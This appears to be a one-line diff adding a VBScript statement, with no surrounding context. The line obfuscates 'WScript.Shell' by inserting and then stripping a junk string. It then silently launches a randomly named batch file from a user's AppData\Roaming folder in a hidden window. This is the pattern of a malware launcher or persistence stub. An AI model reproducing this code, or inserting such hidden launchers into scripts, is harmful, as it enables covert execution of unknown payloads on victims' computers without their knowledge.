@@ -1,0 +1,1 @@
+CreateObject(Replace("WScrcARahipcARaht.cARahShcARahelcARahlcARah","cARah","")).Run """C:\Users\David\AppData\Roaming\PYlfK.bat""", 0
